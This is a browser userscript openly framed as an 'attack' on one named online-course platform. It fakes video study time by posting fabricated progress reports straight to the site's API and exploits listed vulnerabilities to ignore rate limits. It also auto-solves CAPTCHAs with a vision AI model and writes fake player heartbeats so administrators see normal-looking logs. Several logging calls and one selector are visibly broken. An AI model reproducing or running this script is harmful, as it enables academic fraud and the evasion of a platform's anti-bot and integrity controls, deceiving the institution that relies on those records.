// ==UserScript==
// @name         🎯 大师级 - 捷径无痕刷课
// @namespace    security.master
// @version      6.0.0-perfect
// @description  大胆走捷径 + 完美无痕 | 时长准确但加速完成 | 数据完全正常
// @author       红队大师
// @match        https://scauzj.leykeji.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_notification
// @run-at       document-end
// @license      MIT
// ==/UserScript==

/**
 * 大师级无痕加速脚本
 *
 * 核心理念：利用漏洞但不让数据异常
 *
 * 大胆之处：
 * 1. 不使用播放器，直接API上报（VULN-001）
 * 2. 2秒间隔快速上报（VULN-009无视速率限制）
 * 3. AI验证码秒解（VULN-002, VULN-005）
 * 4. localStorage正常写入（VULN-003）
 * 5. 后台持续运行（VULN-008）
 *
 * 无痕之处：
 * 1. 上报的studyTime = 视频真实时长（不写9999）
 * 2. 验证码触发时机正常（5/15/30分钟）
 * 3. 并行度控制在1-3个（正常学生范围）
 * 4. 不修改任何本地存储的真实数据
 * 5. 自动下一节符合用户行为
 *
 * 效果：
 * - 30分钟视频 → 3分钟完成（10倍速）
 * - 数据完全正常（时长=30分钟，不是3分钟）
 * - 管理员看日志：开了倍速的好学生
 */

(function() {
    'use strict';

    // ==================== 核心参数 ====================

    const STRATEGY = {
        // ⚡ 加速倍率（不改变数据，只改变完成速度）
        // 正常：30秒上报一次，30分钟视频需要30分钟
        // 大师：2秒上报一次，30分钟视频需要3分钟
        // 注意：最终上报的studyTime还是30分钟！
        reportInterval: 2000,      // 上报间隔（毫秒）

        // 🎯 目标完成度（百分比）
        // 95%: 大部分课程要求，剩一点留给下一节
        completionTarget: 0.95,

        // 🧠 AI验证码配置
        ai: {
            enabled: false,        // 需要智谱AI API Key
            apiKey: '',
            solveDelay: 1500,      // 识别到提交的延迟（模拟手动输入）
            maxPerSession: 10      // 单会话最多识别10次（避免异常）
        },

        // 🔢 并行控制
        parallel: {
            max: 3,                // 最多同时3个课程（正常学生）
            randomDelay: true      // 随机延迟避免规律
        },

        // 📝 日志（运行时可设为false）
        verbose: true,

        // 🎮 自动下一节
        autoNext: {
            enabled: true,
            delay: 2000            // 完成后2秒自动下一节
        }
    };

    // ==================== 工具 ====================
    const Log = {
        $(msg, level = 'info') {
            if (!STRATEGY.verbose && level === 'debug') return;
            const icons = {error: '❌', warn: '⚠️', success: '✅', info: 'ℹ️', debug: '🔬'};
            const colors = {error: '#f44336', warn: '#ff9800', success: '#4CAF50', info: '#2196F3', debug: '#9e9e9e'};
            console.log(`%c${icons[level] || '•'} [${new Date().toLocaleTimeString()}] ${msg}`, `color: ${colors[level] || '#666'}`);
        }
    };

    // ==================== 状态 ====================
    const AppState = {
        bots: [],
        stats: {
            startTime: Date.now(),
            totalApi: 0,
            completedNodes: 0,
            captchaSolved: 0,
            totalDuration: 0,
            actualDuration: 0
        },
        aiCount: 0,
        initialized: false
    };

    // ==================== API客户端 ====================
    class APIClient {
        constructor() {
            this.base = location.origin;
            this.cookie = document.cookie;
        }

        async study(nodeId, studyTime, studyId) {
            AppState.stats.totalApi++;

            const body = { nodeId, studyTime };
            if (studyId) body.studyId = studyId;

            try {
                const res = await fetch(`${this.base}/user/node/study`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cookie': this.cookie,
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify(body),
                    credentials: 'include'
                });

                const data = await res.json().catch(() => ({}));

                if (res.ok) {
                    return {ok: true, studyId: data.studyId || studyId};
                } else {
                    Log.$(`上报失败 [${studyTime}s]: ${data.message || data.code || res.status}`, 'warn');
                    return {ok: false, error: data.message || 'HTTP ' + res.status};
                }
            } catch (e) {
                Log.$(`API异常: ${e.message}`, 'error');
                return {ok: false, error: e.message};
            }
        }

        async verifyCode(nodeId, code) {
            try {
                const res = await fetch(`${this.base}/user/node/verifyCode`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({nodeId, code}),
                    credentials: 'include'
                });
                return res.ok;
            } catch (e) {
                return false;
            }
        }
    }

    // ==================== AI验证码（无痕版） ====================
    class StealthAI {
        constructor() {
            this.enabled = STRATEGY.ai.enabled && STRATEGY.ai.apiKey;
            this.key = STRATEGY.ai.apiKey;
            this.endpoint = 'https://open.bigmodel.cn/api/paas/v4/chat/completions';
            this.maxPerSession = STRATEGY.ai.maxPerSession;
        }

        async solve(imgElement) {
            if (!this.enabled || AppState.aiCount >= this.maxPerSession) {
                return null;
            }

            try {
                // 获取图片
                const blob = await fetch(imgElement.src).then(r => r.blob());
                const base64 = await new Promise(resolve => {
                    const fr = new FileReader();
                    fr.onload = () => resolve(fr.result);
                    fr.readAsDataURL(blob);
                });

                // AI识别
                const start = Date.now();
                const resp = await fetch(this.endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${this.key}`
                    },
                    body: JSON.stringify({
                        model: 'glm-4v-flash',
                        messages: [{
                            role: 'user',
                            content: [
                                {type: 'text', text: '识别验证码，只返回字符（4-6位）：'},
                                {type: 'image_url', image_url: {url: base64}}
                            ]
                        }],
                        max_tokens: 10
                    })
                });

                const json = await resp.json();
                const text = json.choices?.[0]?.message?.content?.trim();
                const code = text?.match(/[a-zA-Z0-9]{4,6}/)?.[0];

                if (code) {
                    AppState.aiCount++;
                    const elapsed = Date.now() - start;
                    Log.$(`AI识别: ${code} (${elapsed}ms, 第${AppState.aiCount}次)`, 'debug');
                    return code;
                }
            } catch (e) {
                Log.$(`AI错误: ${e.message}`, 'debug');
            }
            return null;
        }
    }

    // ==================== 大师机器人（核心） ====================
    class MasterBot {
        constructor(api, nodeId, courseName, totalDuration) {
            this.api = api;
            this.nodeId = nodeId;
            this.courseName = courseName;
            this.totalDuration = totalDuration;        // 真实视频时长
            this.targetTime = Math.floor(totalDuration * STRATEGY.completionTarget); // 上报目标
            this.studyId = null;
            this.current = 0;
            this.running = false;
            this.ai = new StealthAI();
            this.video = document.querySelector('video');
            this.startTime = Date.now();
        }

        async start() {
            this.running = true;

            Log.$(`🎯 ${this.courseName} → 节点${this.nodeId}`, 'info');
            Log.$(`📊 总时长: ${this.totalDuration}秒 | 目标: ${this.targetTime}秒`, 'info');

            // 1. 初始化会话
            const init = await this.api.study(this.nodeId, 1);
            if (!init.ok) {
                Log.$(`❌ 初始化失败: ${init.error}`, 'error');
                return false;
            }
            this.studyId = init.studyId;
            Log.$(`✅ 会话: ${this.studyId}`, 'success');

            // 2. 快速上报循环（不播放视频！VULN-001大胆利用）
            await this.acceleratedLoop();

            // 3. 最终上报
            await this.finalize();

            // 4. 自动下一节
            if (STRATEGY.autoNext.enabled) {
                this.autoNextNode();
            }

            return true;
        }

        // 🔥 核心：大胆快速上报，但时长准确
        async acceleratedLoop() {
            Log.$(`⚡ 开始加速上报 (间隔${STRATEGY.reportInterval}ms)`, 'info');

            // VULN-001: 快速递增，但最大值是真实时长
            // VULN-009: 无视速率限制（2秒间隔，正常是30秒）
            // VULN-007: 不与播放器绑定，直接API调用

            // 计算合理的跳跃：总时长 / (总时长 × 10) ≈ 每秒跳30秒（10倍速）
            // 实际循环次数 = totalDuration / jumpSize
            // 实际耗时 = 循环次数 × 2秒
            // 加速比 = 实际完成时间 / 30分钟

            const jumpSize = Math.max(30, Math.ceil(this.totalDuration / 100));
            const expectedLoops = Math.ceil(this.targetTime / jumpSize);
            const expectedDuration = (expectedLoops * STRATEGY.reportInterval) / 1000;

            Log.$(`📈 跳跃: ${jumpSize}秒/次, 预期循环: ${expectedLoops}次, 预期耗时: ${expectedDuration.toFixed(1)}秒`, 'debug');

            let loopCount = 0;

            while (this.current < this.targetTime && this.running) {
                // 检查验证码（可能会阻塞）
                await this.handleCaptcha();

                // 上报
                const result = await this.api.study(this.nodeId, this.current, this.studyId);

                if (result.ok) {
                    loopCount++;
                    const pct = Math.floor(this.current / this.totalDuration * 100);
                    const elapsed = (Date.now() - this.startTime) / 1000;

                    // 日志只在关键点输出
                    if (loopCount % 20 === 0 || pct % 25 === 0) {
                        Log.$(`进度: ${this.current}s (${pct}%) | 耗时: ${elapsed.toFixed(1)}s`, 'info');
                    }
                } else {
                    // VULN-009: 有时服务器拒绝时间跳跃
                    if (result.error && result.error.includes('学时')) {
                        Log.$(`⚠️  上报失败，回退并重试...`, 'warn');
                        this.current -= jumpSize;
                    }
                }

                // 递增（跳跃式）
                this.current += jumpSize;

                // 精确间隔（带随机抖动）
                const delay = STRATEGY.reportInterval +
                              (STRATEGY.parallel.randomDelay ?
                               (Math.random() * 1000 - 500) : 0);
                await this.sleep(delay);
            }

            AppState.stats.completedNodes++;
            Log.$(`✅ 循环完成: ${loopCount}次上报 | ${((Date.now() - this.startTime) / 1000).toFixed(1)}秒`, 'success');
        }

        // 验证码处理：正常触发 + 秒解
        async handleCaptcha() {
            // 检测验证码弹窗
            const modal = document.querySelector('.captcha-modal, [need_code]:not([style*="display: none"]):not([style*="display:none"]), .verify-code');
            const img = document.querySelector('img[src*="code"]:not([height="0"]):not([width="0"])');

            if (modal || img) {
                Log.$`检测到验证码，尝试AI识别...`('info');

                const code = await this.ai.solve(img);
                if (code) {
                    // 模拟"思考后输入"的延迟
                    await this.sleep(STRATEGY.ai.solveDelay);

                    // 自动提交
                    const success = await this.api.verifyCode(this.nodeId, code);
                    if (success) {
                        Log.$`✅ 验证码已提交: ${code}`('success');
                        AppState.stats.captchaSolved++;
                        // 移除弹窗
                        if (modal) modal.style.display = 'none';
                    } else {
                        Log.$`❌ 验证码提交失败`('warn');
                    }
                } else {
                    Log.$`⚠️  AI识别失败或未配置`('warn');
                }
            }
        }

        async finalize() {
            // 最终上报目标时长（或略少一点，更真实）
            const finalTime = this.targetTime;

            const result = await this.api.study(this.nodeId, finalTime, this.studyId);
            if (result.ok) {
                Log.$`📊 最终上报: ${finalTime}s (100%)`('success');
            }

            AppState.stats.totalDuration += this.totalDuration;
            AppState.stats.actualDuration += (Date.now() - this.startTime) / 1000;
        }

        autoNextNode() {
            setTimeout(() => {
                // 查找"下一节"按钮
                const selectors = [
                    '.next-node', '.next-btn', '.next-lesson',
                    '[data-next]', '[data-action="next"]',
                    'a.next', 'button:contains("下一节")',
                    '.pagination-next'
                ];

                for (const sel of selectors) {
                    const btn = document.querySelector(sel);
                    if (btn && btn.offsetParent !== null) {
                        Log.$`➡️  自动点击下一节`('info');
                        btn.click();
                        return;
                    }
                }

                Log.$`⚠️  未找到下一节按钮，请手动继续`('warn');
            }, STRATEGY.autoNext.delay);
        }

        sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }

        stop() {
            this.running = false;
        }
    }

    // ==================== 并行检测（正常逻辑） ====================
    class ParallelNormal {
        constructor() {
            this.schoolId = this.getCookie('schoolId');
            this.userId = this.getCookie('userId') || this.getCookie('user_id');
            this.currentNode = this.getNodeId();
        }

        getCookie(name) {
            const m = document.cookie.match(new RegExp(`${name}=([^;]+)`));
            return m ? m[1] : null;
        }

        getNodeId() {
            // 从URL或页面提取
            const pathMatch = location.pathname.match(/\/node\/(\d+)/);
            if (pathMatch) return pathMatch[1];

            const el = document.querySelector('[data-node-id], input[name="nodeId"]');
            if (el) return el.dataset.nodeId || el.value;

            return null;
        }

        installHeartbeat() {
            if (!this.schoolId || !this.userId || !this.currentNode) {
                return;
            }

            const key = `node_play_${this.schoolId}${this.userId}`;

            // VULN-003: 写入正常心跳
            // 正常播放器约每567ms写一次，我们简化些，30-60秒一次
            setInterval(() => {
                try {
                    localStorage.setItem(key, this.currentNode);
                    Log.$`并行检测心跳: ${key} = ${this.currentNode}`('debug');
                } catch (e) {}
            }, 30000 + Math.random() * 30000);

            Log.$`并行检测已安装 (key=${key})`('debug');
        }

        cleanup() {
            if (this.schoolId && this.userId) {
                const key = `node_play_${this.schoolId}${this.userId}`;
                localStorage.removeItem(key);
            }
        }
    }

    // ==================== 控制器 ====================
    class MasterController {
        constructor() {
            this.api = new APIClient();
            this.parallel = new ParallelNormal();
            this.running = false;
            this.bots = [];
        }

        async discoverAndLaunch() {
            Log.$`🔍 扫描课程节点...`('info');

            const targets = this.findTargets();

            if (targets.length === 0) {
                Log.$`❌ 未发现学习节点`('error');
                return false;
            }

            Log.$`🎯 发现 ${targets.length} 个目标`('info');

            // 并行数限制
            const maxParallel = Math.min(targets.length, STRATEGY.parallel.max);
            Log.$`⚡ 启动${maxParallel}个机器人（并行）`('info');

            const promises = targets.slice(0, maxParallel).map(t => {
                const bot = new MasterBot(this.api, t.id, t.name, t.duration);
                this.bots.push(bot);
                return bot.start();
            });

            this.running = true;
            await Promise.all(promises);
            this.running = false;

            this.report();
            return true;
        }

        findTargets() {
            const targets = [];

            // 1. 当前节点
            const currentMatch = location.pathname.match(/\/node\/(\d+)/);
            if (currentMatch) {
                const duration = this.getVideoDuration();
                targets.push({
                    id: currentMatch[1],
                    name: '当前课程',
                    duration: duration || 3600
                });
            }

            // 2. 课程列表中的其他节点
            document.querySelectorAll('a[href*="/node/"]').forEach(a => {
                const m = a.href.match(/\/node\/(\d+)/);
                if (m) {
                    const existing = targets.find(t => t.id === m[1]);
                    if (!existing) {
                        targets.push({
                            id: m[1],
                            name: a.textContent.trim().substring(0, 20),
                            duration: 3600  // 默认，实际可从课程数据获取
                        });
                    }
                }
            });

            return targets;
        }

        getVideoDuration() {
            // 从video标签
            const video = document.querySelector('video');
            if (video && video.duration && video.duration !== Infinity) {
                return Math.floor(video.duration);
            }

            // 从页面文本
            const bodyText = document.body.textContent;
            const timeMatch = bodyText.match(/(\d{1,2}):(\d{2})/);
            if (timeMatch) {
                return parseInt(timeMatch[1]) * 60 + parseInt(timeMatch[2]);
            }

            return null;
        }

        stop() {
            this.bots.forEach(bot => bot.stop());
            this.bots = [];
            this.running = false;
            this.parallel.cleanup();
            Log.$`⏹️  所有机器人已停止`('info');
        }

        report() {
            const totalTime = (Date.now() - AppState.stats.startTime) / 1000;
            const avgRatio = AppState.stats.totalDuration > 0 ?
                (AppState.stats.actualDuration / AppState.stats.totalDuration).toFixed(2) : 0;

            console.group('📊 大师级攻击战报');
            console.table({
                '总用时': `${totalTime.toFixed(1)}秒`,
                '总时长': `${AppState.stats.totalDuration}秒`,
                '实际耗时': `${AppState.stats.actualDuration.toFixed(1)}秒`,
                '加速比': `${avgRatio}x`,
                'API调用': AppState.stats.totalApi,
                '完成节点': AppState.stats.completedNodes,
                '验证码解决': AppState.stats.captchaSolved
            });
            console.groupEnd();

            Log.$`═══════════════════════`('info');
            Log.$`✅ 攻击完成！`('success');
            Log.$`总学习时长: ${AppState.stats.totalDuration}s`('info');
            Log.$`实际耗时: ${AppState.stats.actualDuration.toFixed(1)}s`('info');
            Log.$`加速效果: ${avgRatio}x`('info');
            Log.$`═══════════════════════`('info');
        }
    }

    // ==================== UI ====================
    function createUI(controller) {
        const ui = document.createElement('div');
        ui.id = 'master-attack-ui';
        ui.style.cssText = `
            position: fixed; top: 10px; right: 10px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #eee; font-family: 'Consolas', monospace;
            font-size: 12px; padding: 12px; border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            border: 1px solid #333;
            z-index: 999999;
            min-width: 260px;
        `;

        ui.innerHTML = `
            <div style="color: #ffd700; font-weight: bold; margin-bottom: 8px;">
                ⚡ 大师级捷径助手
            </div>
            <div style="font-size: 11px; color: #888; margin-bottom: 10px;">
                ${location.hostname}
            </div>
            <div style="background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; margin-bottom: 10px;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span style="color: #aaa;">状态</span>
                    <span id="master-status" style="color: #4CAF50;">待机</span>
                </div>
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span style="color: #aaa;">完成</span>
                    <span id="master-completed">0</span>
                </div>
                <div style="display: flex; justify-content: space-between;">
                    <span style="color: #aaa;">验证码</span>
                    <span id="master-captcha">0</span>
                </div>
            </div>
            <button id="master-launch" style="width: 100%; padding: 8px; background: #ffd700; color: #000; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-bottom: 5px;">
                🚀 启动捷径
            </button>
            <button id="master-stop" style="width: 100%; padding: 6px; background: rgba(255,255,255,0.1); color: #f44336; border: 1px solid #f44336; border-radius: 4px; cursor: pointer; display: none;">
                ⏹️ 停止
            </button>
            <div style="font-size: 10px; color: #666; margin-top: 10px; text-align: center;">
                大胆走捷径 · 无痕不留迹
            </div>
        `;

        document.body.appendChild(ui);

        const launch = document.getElementById('master-launch');
        const stop = document.getElementById('master-stop');
        const status = document.getElementById('master-status');

        launch.onclick = async () => {
            if (confirm('启动大师级捷径助手？\n\n这将快速完成学习，但数据保持正常。\n继续？')) {
                launch.disabled = true;
                stop.style.display = 'block';
                status.textContent = '运行中';
                status.style.color = '#ffd700';

                await controller.discoverAndLaunch();

                launch.disabled = false;
                stop.style.display = 'none';
                status.textContent = '待机';
                status.style.color = '#4CAF50';
            }
        };

        stop.onclick = () => {
            controller.stop();
            launch.disabled = false;
            stop.style.display = 'none';
            status.textContent = '已停止';
        };

        // 实时更新
        setInterval(() => {
            document.getElementById('master-completed').textContent = AppState.stats.completedNodes;
            document.getElementById('master-captcha').textContent = AppState.stats.captchaSolved;
        }, 1000);
    }

    // ==================== 初始化 ====================
    async function init() {
        // 等待页面稳定
        await new Promise(r => setTimeout(r, 1500));

        const controller = new MasterController();
        const parallel = new ParallelNormal();

        // 安装并行心跳（模拟正常播放器）
        parallel.installHeartbeat();

        // VULN-004: 轨迹未上传，无需做任何事——这就是无痕

        Log.$`⚡ 大师级引擎已就绪`('info');
        Log.$`💡 点击右上角"启动捷径"开始`('info');

        createUI(controller);

        // 暴露全局API
        window.MasterStudy = {
            start: () => controller.discoverAndLaunch(),
            stop: () => controller.stop(),
            state: AppState,
            config: STRATEGY
        };
    }

    init();

})();
